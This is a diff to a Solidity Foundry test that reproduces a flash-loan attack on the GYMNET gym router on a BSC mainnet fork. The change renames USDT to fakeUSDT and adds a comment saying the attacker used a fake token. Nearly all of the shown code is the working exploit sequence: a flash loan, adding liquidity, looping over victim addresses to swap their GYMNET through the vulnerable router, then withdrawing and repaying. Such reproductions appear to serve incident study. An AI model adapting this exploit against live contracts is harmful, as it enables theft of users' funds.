@@ -24,8 +24,8 @@ interface IGymRouter {
 
 contract GYMTest is Test {
     IERC20 GYMNET = IERC20(0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7);
-    IERC20 USDT = IERC20(0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5);
-    // PancakeSwap V2: GYMNET-USDT
+    IERC20 fakeUSDT = IERC20(0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5);
+    // PancakeSwap V2: GYMNET-fakeUSDT
     IERC20 CakeLP = IERC20(0x8e1b75e6c43aEAf5055De07Ab4b76E356d7BB2db);
     Uni_Pair_V2 PancakePair =
         Uni_Pair_V2(0xf5D3cba24783586Db9e7F35188EC0747FfB55F9B);
@@ -39,7 +39,7 @@ contract GYMTest is Test {
     function setUp() public {
         cheats.createSelectFork("bsc", 30448986);
         cheats.label(address(GYMNET), "GYMNET");
-        cheats.label(address(USDT), "USDT");
+        cheats.label(address(fakeUSDT), "fakeUSDT");
         cheats.label(address(CakeLP), "CakeLP");
         cheats.label(address(PancakePair), "PancakePair");
         cheats.label(address(PancakeRouter), "PancakeRouter");
@@ -47,14 +47,15 @@ contract GYMTest is Test {
     }
 
     function testExploit() public {
-        // Start with below amount of USDT. Crucial for further adding liquidity to PancakeRouter
-        // Attack contract already had USDT balance in attack tx
-        deal(address(USDT), address(this), 9_990_000 * 1e18);
-        emit log_named_decimal_uint(
-            "Attacker USDT balance before exploit",
-            USDT.balanceOf(address(this)),
-            USDT.decimals()
-        );
+        // Attacker deploys fakeUSDT contract，forcing victim's gym to exchange fakeUSDT to earn
+        // Start with below amount of fakeUSDT. Crucial for further adding liquidity to PancakeRouter
+        // Attack contract already had fakeUSDT balance in attack tx
+        deal(address(fakeUSDT), address(this), 9_990_000 * 1e18);
+        // emit log_named_decimal_uint(
+        //     "Attacker fakeUSDT balance before exploit",
+        //     fakeUSDT.balanceOf(address(this)),
+        //     fakeUSDT.decimals()
+        // );
         emit log_named_decimal_uint(
             "Attacker GYMNET balance before exploit",
             GYMNET.balanceOf(address(this)),
@@ -71,15 +72,15 @@ contract GYMTest is Test {
         bytes calldata _data
     ) external {
         GYMNET.approve(address(PancakeRouter), ~uint256(0));
-        USDT.approve(address(PancakeRouter), ~uint256(0));
+        fakeUSDT.approve(address(PancakeRouter), ~uint256(0));
         CakeLP.approve(address(PancakeRouter), ~uint256(0));
 
-        console.log("2. Adding GYMNET-USDT liquidity");
+        console.log("2. Adding GYMNET-fakeUSDT liquidity");
         PancakeRouter.addLiquidity(
             address(GYMNET),
-            address(USDT),
+            address(fakeUSDT),
             GYMNET.balanceOf(address(this)),
-            USDT.balanceOf(address(this)),
+            fakeUSDT.balanceOf(address(this)),
             0,
             0,
             address(this),
@@ -114,17 +115,17 @@ contract GYMTest is Test {
 
         console.log("3. Exploiting vulnerability in gym router...");
         for (uint256 i; i < victims.length; ++i) {
-            GYMNETToUSDT(victims[i]);
+            GYMNETTofakeUSDT(victims[i]);
         }
 
         emit log_named_decimal_uint(
-            "4. Removing GYMNET-USDT liquidity",
+            "4. Removing GYMNET-fakeUSDT liquidity",
             CakeLP.balanceOf(address(this)),
             CakeLP.decimals()
         );
         PancakeRouter.removeLiquidity(
             address(GYMNET),
-            address(USDT),
+            address(fakeUSDT),
             CakeLP.balanceOf(address(this)),
             0,
             0,
@@ -135,11 +136,11 @@ contract GYMTest is Test {
         console.log("5. Repaying GYMNET flashloan");
         GYMNET.transfer(address(PancakePair), 1_043_936 * 1e18);
 
-        emit log_named_decimal_uint(
-            "Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            USDT.decimals()
-        );
+        // emit log_named_decimal_uint(
+        //     "Attacker fakeUSDT balance after exploit",
+        //     fakeUSDT.balanceOf(address(this)),
+        //     fakeUSDT.decimals()
+        // );
         emit log_named_decimal_uint(
             "Attacker GYMNET balance after exploit",
             GYMNET.balanceOf(address(this)),
@@ -147,10 +148,10 @@ contract GYMTest is Test {
         );
     }
 
-    function GYMNETToUSDT(address victim) internal {
+    function GYMNETTofakeUSDT(address victim) internal {
         address[] memory path = new address[](2);
         path[0] = address(GYMNET);
-        path[1] = address(USDT);
+        path[1] = address(fakeUSDT);
         uint256[] memory amounts = PancakeRouter.getAmountsOut(
             GYMNET.balanceOf(victim),
             path
